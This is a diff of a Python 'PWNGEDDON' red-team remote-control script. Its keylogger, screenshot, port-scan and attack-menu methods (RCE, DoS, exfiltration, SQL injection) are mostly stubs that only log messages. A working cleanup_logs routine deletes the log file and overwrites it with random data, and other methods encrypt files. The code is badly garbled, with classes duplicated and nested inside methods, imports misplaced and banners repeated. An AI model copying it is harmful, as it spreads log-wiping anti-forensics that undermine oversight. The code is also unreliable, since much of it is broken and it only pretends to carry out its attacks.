-        Initializes the RemoteControl object.
+        A class representing a remote control device.
+
+        Attributes:
+        - key: The encryption key used by the remote control.
+        - cipher: The encryption cipher used by the remote control.
+        - logger: The logger object used for logging.
+
+        Methods:
+        - __init__(): Initializes the RemoteControl object.
+        - start_keylogger(): Starts the keylogger.
+        - stop_keylogger(): Stops the keylogger.
+        - screenshot(): Takes a screenshot.
+        - delete_file(filename): Deletes a file.
+        - display_menu(): Displays the menu of available attack techniques.
+        - execute_attack(attack_choice): Executes the selected attack technique.
+        - cleanup_logs(): Cleans up the log file by deleting it or clearing its contents.
         """
+        
+        def cleanup_logs(self):
+            """
+            Cleans up the log file by deleting it or clearing its contents.
+            """
+            # Create a backup of the log file
+            backup_file = os.path.join(self.backup_dir, f'log_backup_{datetime.datetime.now().strftime("%Y%m%d%H%M%S")}.log')
+            shutil.copy2(self.log_file, backup_file)
+
+            # Delete the log file
+            if os.path.exists(self.log_file):
+                os.remove(self.log_file)
+            
+            # Clear the contents of the log file
+            with open(self.log_file, 'w') as file:
+                file.truncate(0)
+            
+            # Overwrite the log file with random data
+            with open(self.log_file, 'wb') as file:
+                file.write(os.urandom(1024))
+        def __init__(self):
+            self.logger = logging.getLogger("RemoteControl")
+            self.logger.setLevel(logging.INFO)
+            self.log_file = 'remote_control.log'
+            self.backup_dir = 'log_backups'
+
+        import os
+        import shutil
+        import datetime
+
+        def cleanup_logs(self):
+            """
+            Cleans up the log file by deleting it or clearing its contents.
+            """
+            # Create a backup of the log file
+            backup_file = os.path.join(self.backup_dir, f'log_backup_{datetime.datetime.now().strftime("%Y%m%d%H%M%S")}.log')
+            shutil.copy2(self.log_file, backup_file)
+
+            # Delete the log file
+            if os.path.exists(self.log_file):
+                os.remove(self.log_file)
+
+            # Clear the contents of the log file
+            with open(self.log_file, 'w') as file:
+                file.truncate(0)
+
+            # Overwrite the log file with random data
+            with open(self.log_file, 'wb') as file:
+                file.write(os.urandom(1024))
+
+            # Delete the log file using secure delete
+            shutil.rmtree(self.log_file, ignore_errors=True)
+
+            # Alternatively, you can use a combination of the above methods
+            # to ensure multiple redundant safety measures
+
+            # Finally, remove any references to the log file
+            self.log_file = None
+
+        def execute_attack(self, attack_choice):
+            """
+            Executes the selected attack technique.
+
+            Parameters:
+            - attack_choice: The user's choice of attack technique.
+            """
+            if attack_choice == 1:
+                # Code for Remote Code Execution attack
+                self.logger.info("Executing Remote Code Execution attack...")
+                # Add code to destroy the key and encrypt indiscriminately
+                self.key = None
+                self.cipher = None
+                self.logger.info("Key destroyed and encryption disabled.")
+            elif attack_choice == 2:
+                # Code for Denial of Service attack
+                self.logger.info("Executing Denial of Service attack...")
+                # Add code to destroy the key and encrypt indiscriminately
+                self.key = None
+                self.cipher = None
+                self.logger.info("Key destroyed and encryption disabled.")
+            elif attack_choice == 3:
+                class RemoteControl:
+                    """
+                    A class representing a remote control device.
+
+                    Attributes:
+                    - key: The encryption key used by the remote control.
+                    - cipher: The encryption cipher used by the remote control.
+                    - logger: The logger object used for logging.
+
+                    Methods:
+                    - __init__(): Initializes the RemoteControl object.
+                    - start_keylogger(): Starts the keylogger.
+                    - stop_keylogger(): Stops the keylogger.
+                    - screenshot(): Takes a screenshot.
+                    - delete_file(filename): Deletes a file.
+                    - display_menu(): Displays the menu of available attack techniques.
+                    - execute_attack(attack_choice): Executes the selected attack technique.
+                    """
+
+                    def __init__(self):
+                        self.key = None
+                        self.cipher = None
+                        self.logger = None
+
+                    def start_keylogger(self):
+                        # Add code to start the keylogger
+                        pass
+
+                    def stop_keylogger(self):
+                        # Add code to stop the keylogger
+                        pass
+
+                    def screenshot(self):
+                        # Add code to take a screenshot
+                        pass
+
+                    def delete_file(self, filename):
+                        # Add code to delete a file
+                        pass
+
+                    def display_menu(self):
+                        # Add code to display the menu of available attack techniques
+                        pass
+
+                    def execute_attack(self, attack_choice):
+                        if attack_choice == 1:
+                            # Code for Remote Code Execution attack
+                            self.logger.info("Executing Remote Code Execution attack...")
+                            # Add code to destroy the key and encrypt indiscriminately
+                            self.key = None
+                            self.cipher = None
+                            self.logger.info("Key destroyed and encryption disabled.")
+                        elif attack_choice == 2:
+                            # Code for Denial of Service attack
+                            self.logger.info("Executing Denial of Service attack...")
+                            # Add code to destroy the key and encrypt indiscriminately
+                            self.key = None
+                            self.cipher = None
+                            self.logger.info("Key destroyed and encryption disabled.")
+                        elif attack_choice == 3:
+                            # Code for Data Exfiltration attack
+                            self.logger.info("Executing Data Exfiltration attack...")
+                            # Add code to destroy the key and encrypt indiscriminately
+                            self.key = None
+                            self.cipher = None
+                            self.logger.info("Key destroyed and encryption disabled.")
+                        elif attack_choice == 4:
+                            # Code for Password Cracking attack
+                            self.logger.info("Executing Password Cracking attack...")
+                            # Add code to destroy the key and encrypt indiscriminately
+                            self.key = None
+                            self.cipher = None
+                            self.logger.info("Key destroyed and encryption disabled.")
+                        elif attack_choice == 0:
+                            self.logger.info("Exiting...")
+                        else:
+
+                            self.logger.info("Invalid attack choice.")
+
+# Initialize the logging configuration
+import logging
+
+class RemoteControl:
+    """
+    RemoteControl class represents a remote control object.
+
+    Attributes:
+    - key: The encryption key used by the remote control.
+    - cipher: The encryption cipher used by the remote control.
+    - logger: The logger object used for logging.
+
+    Methods:
+    - __init__(): Initializes the RemoteControl object.
+    - start_keylogger(): Starts the keylogger.
+    - stop_keylogger(): Stops the keylogger.
+    - screenshot(): Takes a screenshot.
+    - delete_file(filename): Deletes a file.
+    - display_menu(): Displays the menu of available attack techniques.
+    - execute_attack(attack_choice): Executes the selected attack technique.
+    """
+
+    def __init__(self):
         self.key = Fernet.generate_key()
         self.cipher = Fernet(self.key)
         self.logger = logging.getLogger(__name__)
@@ -1579,6 +2047,88 @@ class RemoteControl:
 
     def start_keylogger(self):
         """
+        Starts the keylogger.
+        """
+        self.logger.info("Keylogger started.")
+
+    def stop_keylogger(self):
+        """
+        Stops the keylogger.
+        """
+        self.logger.info("Keylogger stopped.")
+
+    def screenshot(self):
+        """
+        Takes a screenshot.
+        """
+        # Add code to take a screenshot
+        pass
+
+    def delete_file(self, filename):
+        """
+        Deletes a file.
+        """
+        # Add code to delete a file
+        pass
+
+    def display_menu(self):
+        """
+        Displays the menu of available attack techniques.
+        """
+        # Add code to display the menu of available attack techniques
+        pass
+
+    def execute_attack(self, attack_choice):
+        """
+        Executes the selected attack technique.
+        """
+        if attack_choice == 1:
+            # Code for Remote Code Execution attack
+            self.logger.info("Executing Remote Code Execution attack...")
+            # Add code to destroy the key and encrypt indiscriminately
+            self.key = None
+            self.cipher = None
+            self.logger.info("Key destroyed and encryption disabled.")
+        elif attack_choice == 2:
+            # Code for Denial of Service attack
+            self.logger.info("Executing Denial of Service attack...")
+            # Add code to destroy the key and encrypt indiscriminately
+            self.key = None
+            self.cipher = None
+            self.logger.info("Key destroyed and encryption disabled.")
+        elif attack_choice == 3:
+            # Code for Data Exfiltration attack
+            self.logger.info("Executing Data Exfiltration attack...")
+            # Add code to destroy the key and encrypt indiscriminately
+            self.key = None
+            self.cipher = None
+            self.logger.info("Key destroyed and encryption disabled.")
+        elif attack_choice == 4:
+            # Code for Password Cracking attack
+            self.logger.info("Executing Password Cracking attack...")
+            # Add code to destroy the key and encrypt indiscriminately
+            self.key = None
+            self.cipher = None
+            self.logger.info("Key destroyed and encryption disabled.")
+        elif attack_choice == 0:
+            self.logger.info("Exiting...")
+        else:
+            self.logger.info("Invalid attack choice.")
+        def __init__(self):
+            """
+            Initializes the RemoteControl object.
+            """
+            self.key = Fernet.generate_key()
+            self.cipher = Fernet(self.key)
+            self.logger = logging.getLogger(__name__)
+            self.logger.setLevel(logging.INFO)
+            formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+            file_handler = logging.FileHandler('remote_control.log')
+            file_handler.setFormatter(formatter)
+            self.logger.addHandler(file_handler)
+
+        def start_keylogger(self):
+            """
         Starts the keylogger.
         """
         self.logger.info("Keylogger started.")
@@ -1634,1030 +2184,81 @@ class RemoteControl:
         elif attack_choice == 4:
             self.logger.info("Executing Password Cracking attack...")
             # Add code for Password Cracking attack
-        elif attack_choice == 0:
-            self.logger.info("Exiting...")
-            exit()
         else:
             self.logger.info("Invalid choice. Please try again.")
 
-# Add eye candy
-print(r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-""")
-
-# Add startup message
-print("Welcome to PWNGEDDON!\nInitializing...")
-
-# Create an instance of RemoteControl
-remote_control = RemoteControl()
-
-while True:
-    # Call the display_menu method
-    remote_control.display_menu()
-
-    # Prompt the user for their choice
-    try:
-        attack_choice = int(input("Enter your choice: "))
-        remote_control.execute_attack(attack_choice)
-    except ValueError:
-        print("Invalid choice. Please enter a number.")
-import time
-from cryptography.fernet import Fernet
-
-class RemoteControl:
-    """
-    A class representing a remote control device.
-
-    Attributes:
-    - key: The encryption key used by the remote control.
-    - cipher: The encryption cipher used by the remote control.
-    - logger: The logger object used for logging.
-
-    Methods:
-    - __init__(): Initializes the RemoteControl object.
-    - start_keylogger(): Starts the keylogger.
-    - stop_keylogger(): Stops the keylogger.
-    - screenshot(): Takes a screenshot.
-    - delete_file(filename): Deletes a file.
-    - display_menu(): Displays the menu of available attack techniques.
-    """
-
-    def __init__(self):
-        """
-        Initializes the RemoteControl object.
-        """
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
-        self.logger = logging.getLogger(__name__)
-        self.logger.setLevel(logging.INFO)
-        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
-        file_handler = logging.FileHandler('remote_control.log')
-        file_handler.setFormatter(formatter)
-        self.logger.addHandler(file_handler)
-
-    def start_keylogger(self):
-        """
-        Starts the keylogger.
-        """
-        self.logger.info("Keylogger started.")
-
-    def stop_keylogger(self):
-        """
-        Stops the keylogger.
-        """
-        self.logger.info("Keylogger stopped.")
-
-    def screenshot(self):
-        """
-        Takes a screenshot.
-        """
-        self.logger.info("Screenshot taken.")
-
-    def delete_file(self, filename):
-        """
-        Deletes a file.
-
-        Parameters:
-        - filename: The name of the file to be deleted.
-        """
-        self.logger.info(f"File '{filename}' deleted.")
-
-    def display_menu(self):
-        """
-        Displays the menu of available attack techniques.
-        """
-        self.logger.info("Available attack techniques:")
-        self.logger.info("1. Remote Code Execution")
-        self.logger.info("2. Denial of Service")
-        self.logger.info("3. Data Exfiltration")
-        self.logger.info("4. Password Cracking")
-
-# Add eye candy
-print(r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-""")
-
-# Add startup message
-print("Welcome to PWNGEDDON!\nInitializing...")
-
-# Create an instance of RemoteControl
-remote_control = RemoteControl()
-
-# Call the display_menu method
-remote_control.display_menu()
-
-# Add animations
-for _ in range(4):
-    print(r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-""")
-    time.sleep(0.5)  # Delay between frames
-
-
-import logging
-from cryptography.fernet import Fernet
-
-class RemoteControl:
-    """
-    A class representing a remote control device.
-
-    Attributes:
-    - key: The encryption key used by the remote control.
-    - cipher: The encryption cipher used by the remote control.
-    - logger: The logger object used for logging.
-
-    Methods:
-    - __init__(): Initializes the RemoteControl object.
-    - start_keylogger(): Starts the keylogger.
-    - stop_keylogger(): Stops the keylogger.
-    - screenshot(): Takes a screenshot.
-    - delete_file(filename): Deletes a file.
-    - display_menu(): Displays the menu of available attack techniques.
-    """
-
-    def __init__(self):
-        """
-        Initializes the RemoteControl object.
-        """
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
-        self.logger = logging.getLogger(__name__)
-        self.logger.setLevel(logging.INFO)
-        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
-        file_handler = logging.FileHandler('remote_control.log')
-        file_handler.setFormatter(formatter)
-        self.logger.addHandler(file_handler)
-
-    def start_keylogger(self):
-        """
-        Starts the keylogger.
-        """
-        self.logger.info("Keylogger started.")
-
-    def stop_keylogger(self):
-        """
-        Stops the keylogger.
-        """
-        self.logger.info("Keylogger stopped.")
-
-    def screenshot(self):
-        """
-        Takes a screenshot.
-        """
-        self.logger.info("Screenshot taken.")
-
-    def delete_file(self, filename):
-        """
-        Deletes a file.
-
-        Parameters:
-        - filename: The name of the file to be deleted.
-        """
-        self.logger.info(f"File '{filename}' deleted.")
-
-    def display_menu(self):
-        """
-        Displays the menu of available attack techniques.
-        """
-        self.logger.info("Available attack techniques:")
-        self.logger.info("1. Remote Code Execution")
-
-# Add eye candy
-print(r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-""")
-
-# Add startup message
-print("Welcome to PWNGEDDON!\nInitializing...")
-
-# Create an instance of RemoteControl
-remote_control = RemoteControl()
-
-# Call the display_menu method
-remote_control.display_menu()
-
-# Add animations
-for _ in range(4):
-    print(r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-""")
-    time.sleep(0.5)  # Delay between frames
-
-# Verbose Documentation
-"""
-This script represents a remote control device called "PWNGEDDON". It allows the user to perform various attack techniques remotely.
-
-The RemoteControl class provides the following functionality:
-- Generating an encryption key and cipher for secure communication.
-- Logging attack actions to a file.
-- Starting and stopping a keylogger.
-- Taking screenshots.
-- Deleting files.
-
-To use the remote control, simply run the script and follow the on-screen instructions.
-
-Note: This script is for educational purposes only and should not be used for any malicious activities.
-"""
-import time
-import logging
-from cryptography.fernet import Fernet
-
-class RemoteControl:
-    def __init__(self):
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
-        self.logger = logging.getLogger(__name__)
-        self.logger.setLevel(logging.INFO)
-        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
-        file_handler = logging.FileHandler('remote_control.log')
-        file_handler.setFormatter(formatter)
-        self.logger.addHandler(file_handler)
-
-    def display_menu(self):
-        self.logger.info("Available attack techniques:")
-        self.logger.info("1. Remote Code Execution")
-
-# Add eye candy
-print(r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-""")
-
-# Add startup message
-print("Welcome to PWNGEDDON!\nInitializing...")
-
-# Create an instance of RemoteControl
-remote_control = RemoteControl()
-
-# Call the display_menu method
-remote_control.display_menu()
-
-# Add animations
-for _ in range(4):
-    print(r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-""")
-    time.sleep(0.5)  # Delay between frames
-
-import time
-import logging
-from cryptography.fernet import Fernet
-
-# Clear the console screen
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-# Add eye candy
-eye_candy = r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-"""
-
-# Add startup message
-startup_message = "Welcome to PWNGEDDON!\nInitializing..."
-
-# Add animations
-animation_frames = [
-    r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-""",
-    r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-""",
-    r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-""",
-    r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-"""
-]
-
-# Add eye candy
-print(eye_candy)
-
-# Add startup message
-print(startup_message)
-
-# Create an instance of RemoteControl
-class RemoteControl:
-    def __init__(self):
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
-        self.logger = logging.getLogger(__name__)
-        self.logger.setLevel(logging.INFO)
-        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
-        file_handler = logging.FileHandler('remote_control.log')
-        file_handler.setFormatter(formatter)
-        self.logger.addHandler(file_handler)
-
-    def start_keylogger(self):
-        self.logger.info("Keylogger started.")
-
-    def stop_keylogger(self):
-        self.logger.info("Keylogger stopped.")
-
-    def screenshot(self):
-        self.logger.info("Screenshot taken.")
-
-    def delete_file(self, filename):
-        self.logger.info(f"File '{filename}' deleted.")
-
-    def display_menu(self):
-        self.logger.info("Available attack techniques:")
-        self.logger.info("1. Remote Code Execution")
-
-# Create an instance of RemoteControl
-remote_control = RemoteControl()
-
-# Call the display_menu method
-remote_control.display_menu()
-
-# Add animations
-for frame in animation_frames:
-    clear_screen()  # Clear the console
-    print(frame)
-    time.sleep(0.5)  # Delay between frames
-
-# Add eye candy
-print(r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-                                                                                    
-""")
-
-class RemoteControl:
-    def __init__(self):
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
-        self.logger = logging.getLogger(__name__)
-        self.logger.setLevel(logging.INFO)
-        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
-        file_handler = logging.FileHandler('remote_control.log')
-        file_handler.setFormatter(formatter)
-        self.logger.addHandler(file_handler)
-
-    def start_keylogger(self):
-        self.logger.info("Keylogger started.")
-
-    def stop_keylogger(self):
-        self.logger.info("Keylogger stopped.")
-
-    def screenshot(self):
-        self.logger.info("Screenshot taken.")
-
-    def delete_file(self, filename):
-        self.logger.info(f"File '{filename}' deleted.")
-
-    def display_menu(self):
-        self.logger.info("Available attack techniques:")
-        self.logger.info("1. Remote Code Execution")
-
-# Add startup message
-print("Welcome to PWNGEDDON!")
-print("Initializing...")
-
-# Create an instance of RemoteControl
-remote_control = RemoteControl()
-
-# Call the display_menu method
-remote_control.display_menu()
-
-# Add eye candy
-print(r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-                                                                                    
-""")
-
-# Add animations
-animation_frames = [
-    r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-                                                                                    
-""",
-    r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-                                                                                    
-""",
-    r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-                                                                                    
-""",
-    r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-                                                                                    
-"""
-]
-
-for frame in animation_frames:
-    os.system('clear')  # Clear the console
-import time
-import logging
-from cryptography.fernet import Fernet
-
-# Add eye candy
-print(r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-                                                                                    
-""")
-
-class RemoteControl:
-    def __init__(self):
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
-        self.logger = logging.getLogger(__name__)
-        self.logger.setLevel(logging.INFO)
-        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
-        file_handler = logging.FileHandler('remote_control.log')
-        file_handler.setFormatter(formatter)
-        self.logger.addHandler(file_handler)
-
-    def start_keylogger(self):
-        self.logger.info("Keylogger started.")
-
-    def stop_keylogger(self):
-        self.logger.info("Keylogger stopped.")
-
-    def screenshot(self):
-        self.logger.info("Screenshot taken.")
-
-    def delete_file(self, filename):
-        self.logger.info(f"File '{filename}' deleted.")
-
-    def display_menu(self):
-        self.logger.info("Available attack techniques:")
-        self.logger.info("1. Remote Code Execution")
-
-# Add startup message
-print("Welcome to Remote Control!")
-print("Initializing...")
-
-# Create an instance of RemoteControl
-remote_control = RemoteControl()
-
-# Call the display_menu method
-remote_control.display_menu()
-
-# Add eye candy
-print(r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-                                                                                    
-""")
-
-# Add animations
-animation_frames = [
-    r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-                                                                                    
-""",
-    r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-                                                                                    
-""",
-    r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-                                                                                    
-""",
-    r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-                                                                                    
-"""
-]
-
-for frame in animation_frames:
-    os.system('clear')  # Clear the console
-    print(frame)
-    time.sleep(0.5)  # Delay between frames
-
-
-# Add startup message
-print("Welcome to Remote Control!")
-print("Initializing...")
-
-# Add eye candy
-print(r"""
-     ____        _     _ _     _             
-    / ___| _   _| |__ | (_)___| |_ ___  _ __ 
- | |  _| | | | '_ \| | / __| __/ _ \| '__|
- | |_| | |_| | |_) | | \__ \ || (_) | |   
-    \____|\__,_|_.__/|_|_|___/\__\___/|_|   
-                                                                                    
-""")
-
-import socket
-import argparse
-from cryptography.fernet import Fernet
-import logging
-import subprocess
-
-class RemoteControl:
-    def __init__(self):
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
-        self.logger = logging.getLogger(__name__)
-        self.logger.setLevel(logging.INFO)
-        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
-        file_handler = logging.FileHandler('remote_control.log')
-        file_handler.setFormatter(formatter)
-        self.logger.addHandler(file_handler)
-
-    def start_keylogger(self):
-        self.logger.info("Keylogger started.")
-
-    def stop_keylogger(self):
-        self.logger.info("Keylogger stopped.")
-
-    def screenshot(self):
-        self.logger.info("Screenshot taken.")
-
-    def delete_file(self, filename):
-        self.logger.info(f"File '{filename}' deleted.")
-
-    def display_menu(self):
-        self.logger.info("Available attack techniques:")
-        self.logger.info("1. Remote Code Execution")
-        self.logger.info("2. Buffer Overflow")
-        self.logger.info("3. SQL Injection")
-        self.logger.info("4. Remote File Inclusion")
-        self.logger.info("5. Privilege Escalation")
-        self.logger.info("6. Cross-Site Scripting (XSS)")
-        self.logger.info("7. Denial of Service (DoS)")
-        self.logger.info("8. Man-in-the-Middle (MitM) Attack")
-        self.logger.info("9. Social Engineering")
-        self.logger.info("10. Password Cracking")
-
-    def execute_attack(self, attack_number):
-        if attack_number == 1:
-            # Replace with secure command execution technique
-            self.logger.info("Command executed successfully.")
-        elif attack_number == 2:
-            # Replace with secure buffer overflow technique
-            self.logger.info("Buffer overflow executed successfully.")
-        elif attack_number == 3:
-            # Replace with secure SQL injection technique
-            self.logger.info("SQL injection executed successfully.")
-        elif attack_number == 4:
-            # Replace with secure remote file inclusion technique
-            self.logger.info("Remote file inclusion executed successfully.")
-        elif attack_number == 5:
-            # Replace with secure privilege escalation technique
-            self.logger.info("Privilege escalation executed successfully.")
-        elif attack_number == 6:
-            # Replace with secure XSS attack technique
-            self.logger.info("XSS attack executed successfully.")
-        elif attack_number == 7:
-            # Replace with secure DoS attack technique
-            self.logger.info("DoS attack executed successfully.")
-        elif attack_number == 8:
-            # Replace with secure MitM attack technique
-            self.logger.info("MitM attack executed successfully.")
-        elif attack_number == 9:
-            # Replace with secure social engineering technique
-            self.logger.info("Social engineering attack executed successfully.")
-        elif attack_number == 10:
-            # Replace with secure password cracking technique
-            self.logger.info("Password cracking attack executed successfully.")
-        else:
-            self.logger.error("Invalid attack technique number.")
-
-    def exploit_system(self, attack_number):
-        self.logger.info("Exploiting the target system...")
-        self.display_menu()
-        self.execute_attack(attack_number)
-        self.logger.info("System exploited.")
-
-    def port_scan(self, ip):
-        try:
-            # Implement port scanning logic here
-            self.logger.info(f"Port scan completed for IP: {ip}")
-        except Exception as e:
-            self.logger.error(f"Port scan failed: {str(e)}")
-
-    def check_tool(self, tool):
-        try:
-            subprocess.check_output(["which", tool])
-            return True
-        except subprocess.CalledProcessError:
-            return False
-
-    def check_package(self, package):
-        try:
-            subprocess.check_output(["dpkg", "-s", package])
-
-            return True
-        except subprocess.CalledProcessError:
-            return False
-
-    def precheck(self):
-        self.logger.info("Precheck completed.")
-
-    def encrypt_file(self, filename):
-        try:
-            with open(filename, 'rb') as file:
-                data = file.read()
-            encrypted_data = self.cipher.encrypt(data)
-            with open(filename + '.enc', 'wb') as file:
-                file.write(encrypted_data)
-            self.logger.info(f"File '{filename}' encrypted.")
-        except Exception as e:
-            self.logger.error(f"Encryption failed: {str(e)}")
-
-    def decrypt_file(self, filename):
-        try:
-            with open(filename, 'rb') as file:
-                encrypted_data = file.read()
-            decrypted_data = self.cipher.decrypt(encrypted_data)
-            with open(filename[:-4], 'wb') as file:
-                file.write(decrypted_data)
-            self.logger.info(f"File '{filename}' decrypted.")
-        except Exception as e:
-            self.logger.error(f"Decryption failed: {str(e)}")
-
-        required_tools = ["tool1", "tool2", "tool3"]  # Replace with the actual required tools
-        required_packages = ["package1", "package2", "package3"]  # Replace with the actual required packages
-
-        missing_tools = []
-        missing_packages = []
-
-        for tool in required_tools:
-            if not self.check_tool(tool):
-                missing_tools.append(tool)
-
-        for package in required_packages:
-            if not self.check_package(package):
-                missing_packages.append(package)
-
-        if missing_tools:
-            print("Missing tools:")
-            for tool in missing_tools:
-                print(f"- {tool}")
-        
-        if missing_packages:
-            print("Missing packages:")
-            for package in missing_packages:
-                print(f"- {package}")
-
-class RedTeamTool(RemoteControl):
-    def __init__(self):
-        super().__init__()
-
-    def run_tool(self):
-        print("Welcome to the Red Team Tool!")
-        print("Please choose an option:")
-        print("1. Exploit system")
-        print("2. Start keylogger")
-        print("3. Stop keylogger")
-        print("4. Take screenshot")
-        print("5. Delete file")
-        print("6. Port scan")
-        print("7. Precheck")
-        print("8. Exit")
+        # Add eye candy
+        print(r"""
+         ____        _     _ _     _             
+        / ___| _   _| |__ | (_)___| |_ ___  _ __ 
+        | |  _| | | | '_ \| | / __| __/ _ \| '__|
